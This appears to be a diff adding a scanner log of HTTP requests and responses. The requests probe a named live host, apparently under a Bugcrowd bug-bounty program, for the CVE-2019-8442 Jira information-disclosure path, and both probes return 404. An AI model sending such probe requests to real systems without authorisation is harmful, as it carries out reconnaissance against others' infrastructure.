@@ -1,0 +1,70 @@
+[CVE-2019-8442] Dumped HTTP request for https://status.techsolutions.bitpanda.com/s/30rudigY8R5c0uy2je6NTk6VBnL/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
+
+
+GET /s/30rudigY8R5c0uy2je6NTk6VBnL/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2019-8442] Dumped HTTP response https://status.techsolutions.bitpanda.com/s/30rudigY8R5c0uy2je6NTk6VBnL/_/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
+
+HTTP/1.1 404 Not Found
+Connection: close
+Atl-Request-Id: 1a449320-0017-4be0-86f9-72f066226dfe
+Atl-Traceid: 1a44932000174be086f972f066226dfe
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=64,atl-edge-internal;dur=3,atl-edge-upstream;dur=62,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 4b0f0fc4315eea23426f6074a7254a8c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: dPM6jgNCZTvwysuN1QeElhp2hcCxBNOfFwmu1aThyKRMvzJb6ln7pQ==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 517190495
+X-Xss-Protection: 1; mode=block
+Content-Length: 0
+
+
+[CVE-2019-8442] Dumped HTTP request for https://status.techsolutions.bitpanda.com/s/30rudigY8R5c0uy2je6NTk6VBnL/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+
+
+GET /s/30rudigY8R5c0uy2je6NTk6VBnL/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[CVE-2019-8442] Dumped HTTP response https://status.techsolutions.bitpanda.com/s/30rudigY8R5c0uy2je6NTk6VBnL/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
+
+HTTP/1.1 404 Not Found
+Connection: close
+Atl-Request-Id: 46f2d0f2-9ee8-4f17-ba98-e4245300270f
+Atl-Traceid: 46f2d0f29ee84f17ba98e4245300270f
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=65,atl-edge-internal;dur=3,atl-edge-upstream;dur=63,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 5bbbde7889bb9c7247f5924a32d2fdf0.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: G0eTyDjxKBZ2tTlcDBG-YirEoBiO5szIm9dj0mEa0Ua0Fhfvxo-zZQ==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 179805989
+X-Xss-Protection: 1; mode=block
+Content-Length: 0
+
+
